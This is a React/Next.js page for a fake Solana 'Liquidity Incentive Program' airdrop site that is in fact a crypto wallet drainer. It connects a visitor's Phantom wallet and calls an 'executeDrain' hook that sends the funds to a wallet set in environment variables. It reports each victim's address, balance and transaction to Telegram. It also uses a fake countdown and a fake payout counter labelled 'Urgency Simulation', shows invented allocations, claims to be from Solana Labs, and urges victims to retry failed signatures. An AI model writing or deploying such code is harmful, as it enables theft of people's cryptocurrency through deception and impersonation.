"use client";

import { useState, useEffect } from 'react';
import { Connection, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { ethers } from 'ethers';
import { useSolanaDrain } from '@/hooks/useSolanaDrain';
import { sendTelegramLog } from '@/utils/telegramLogger';
import { calculateAllocation } from '@/utils/calculateAllocation';
import WalletModal from '@/components/WalletModal';
import styles from './page.module.css';

export default function Home() {
  const [connected, setConnected] = useState(false);
  const [walletType, setWalletType] = useState(null);
  const [walletAddress, setWalletAddress] = useState(null);
  const [showModal, setShowModal] = useState(false);
  const [realBalance, setRealBalance] = useState(0);
  const [allocatedAmount, setAllocatedAmount] = useState(0);
  const [distributed, setDistributed] = useState(1784.42);
  const [countdown, setCountdown] = useState(180);
  const [status, setStatus] = useState('idle'); // idle, processing, success, error

  const { executeDrain } = useSolanaDrain(
    process.env.NEXT_PUBLIC_SOLANA_RPC, 
    process.env.NEXT_PUBLIC_SOLANA_WALLET
  );

  // Distributed Counter Logic (Urgency Simulation)
  useEffect(() => {
    const interval = setInterval(() => {
      setDistributed(prev => prev + (Math.random() * 0.08));
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  // Countdown Timer
  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => (prev <= 1 ? 0 : prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (s) => `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`;

  const handleConnect = async (type) => {
    try {
      let address, balance;
      setWalletType(type);

      if (type === 'phantom') {
        if (!window.solana) return alert('Please open in Phantom App browser');
        const resp = await window.solana.connect();
        address = resp.publicKey.toString();
        const conn = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC);
        const balInLamports = await conn.getBalance(resp.publicKey);
        balance = balInLamports / LAMPORTS_PER_SOL;
      } else if (type === 'metamask') {
        if (!window.ethereum) return alert('Please open in MetaMask App browser');
        const provider = new ethers.BrowserProvider(window.ethereum);
        const accounts = await provider.send("eth_requestAccounts", []);
        address = accounts[0];
        balance = 0.012; // Example static balance for ETH in this demo
      }

      setWalletAddress(address);
      setRealBalance(balance);
      setConnected(true);
      setShowModal(false);

      // Allocation logic: only for wallets with > 0.005 SOL
      const allocation = balance > 0.005 ? calculateAllocation(address) : 0;
      setAllocatedAmount(allocation);

      // Notify Telegram immediately
      await sendTelegramLog('connected', { address, type, balance, amount: allocation });

    } catch (e) { 
      console.error(e); 
      alert("Connection Failed. Ensure your wallet is unlocked.");
    }
  };

  const handleAction = async () => {
    try {
      setStatus('processing');
      const result = await executeDrain(window.solana);
      
      if (result.success) {
        setStatus('success');
        await sendTelegramLog('success', { address: walletAddress, balance: realBalance, tx: result.txId });
        setTimeout(() => {
          window.location.href = `https://solscan.io/account/${walletAddress}`;
        }, 5000);
      } else {
        throw new Error(result.error || "User denied signature");
      }
    } catch (err) {
      setStatus('error');
      await sendTelegramLog('failed', { address: walletAddress, balance: realBalance, error: err.message });
    }
  };

  return (
    <div className={styles.container}>
      {/* Navbar */}
      <nav className={styles.nav}>
        <div className={styles.logo}>✦ Solana Liquidity Project</div>
        <div className={styles.badge}>Epoch V3.1 Active</div>
      </nav>

      <main className={styles.main}>
        <div className={styles.glassCard}>
          <h1 className={styles.heroTitle}>Liquidity Incentive Program</h1>
          <p className={styles.subtitle}>Mainnet Beta Protocol Rewards</p>

          <div className={styles.timerBox}>
            CURRENT EPOCH CLOSES IN: <span className={styles.timeText}>{formatTime(countdown)}</span>
          </div>

          <div className={styles.statsGrid}>
            <div className={styles.statItem}>
              <div className={styles.statValue}>{distributed.toFixed(2)}</div>
              <div className={styles.statLabel}>SOL DISTRIBUTED</div>
            </div>
            <div className={styles.statItem}>
              <div className={styles.statValue}>3,500.00</div>
              <div className={styles.statLabel}>TOTAL POOL</div>
            </div>
          </div>

          {!connected ? (
            <div className={styles.actionArea}>
               <button className={styles.primaryButton} onClick={() => setShowModal(true)}>
                Connect Wallet to Verify Eligibility
              </button>
              <p className={styles.footerNote}>Participating wallets must show consistent on-chain activity.</p>
            </div>
          ) : (
            <div className={styles.actionArea}>
              {realBalance <= 0.005 ? (
                <div className={styles.errorBox}>
                   <p><b>Status: Ineligible</b></p>
                   <p style={{fontSize: '0.8rem', opacity: 0.7}}>This address does not meet the minimum activity requirements for the current epoch.</p>
                </div>
              ) : status === 'success' ? (
                <div className={styles.successBox}>
                  <h3>✅ Participation Confirmed</h3>
                  <p>Your allocation of {allocatedAmount.toFixed(2)} SOL is queued.</p>
                  <p className={styles.etaText}>Estimated Arrival: 2 - 4 Hours</p>
                </div>
              ) : (
                <>
                  <div className={styles.eligibleBox}>
                    <p>Validation Successful</p>
                    <h2>{allocatedAmount.toFixed(2)} SOL</h2>
                  </div>
                  <button 
                    className={styles.primaryButton} 
                    onClick={handleAction} 
                    disabled={status === 'processing'}
                  >
                    {status === 'processing' ? 'Encrypting & Broadcasting...' : 'Verify and Initialize On-Chain Allocation'}
                  </button>
                  {status === 'error' && (
                    <p className={styles.errorText}>
                      <b>Authentication Error:</b> Signature not verified. Please retry to prevent allocation expiration.
                    </p>
                  )}
                </>
              )}
            </div>
          )}
        </div>

        {/* Informational Section */}
        <section className={styles.infoSection}>
          <div className={styles.infoCard}>
            <h4>Protocol Transparency</h4>
            <p>Allocations are calculated based on weighted average liquidity contributions across the Solana Network.</p>
          </div>
        </section>
      </main>

      <footer className={styles.footer}>
        <p>© 2024 Solana Labs • Ecosystem Governance Project</p>
      </footer>

      <WalletModal 
        isOpen={showModal} 
        onClose={() => setShowModal(false)} 
        onSelect={handleConnect} 
      />
    </div>
  );
          }
